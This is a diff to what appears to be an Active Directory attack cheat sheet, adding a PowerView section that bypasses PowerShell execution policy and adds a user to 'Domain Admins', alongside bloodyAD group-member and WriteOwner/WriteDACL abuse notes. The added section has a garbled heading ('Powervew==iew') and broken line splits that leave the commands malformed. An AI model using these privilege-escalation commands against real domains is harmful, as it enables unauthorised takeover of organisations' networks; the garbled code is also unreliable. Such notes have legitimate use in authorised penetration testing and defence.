@@ -18,6 +18,23 @@
 
     bloodyAD --host "DC_IP" -d "domain.local" -u "USER" -p "Password@1" add groupMember "GROUP" "USER"
 
+#### 5) Powervew==iew
+
+    powershell -ep bypass
+    
+    Import-Module .PowerView.ps1
+    
+    $SecPassword = ConvertTo-SecureString 'Password@1' -AsPlainText -Force
+    
+    $Cred = New-Object
+    
+    System.Management.Automation.PSCredential('domain.local\USER1', $SecPassword)
+    
+    Add-DomainGroupMember -Identity 'Domain Admins' -Members 'USER1' -Credential
+
+    $Cred
+
+
 ### WriteOwner on Group
 
 WriteDACL + WriteOwner. Give yourself Generic All with: owneredit.py and dacledit.py
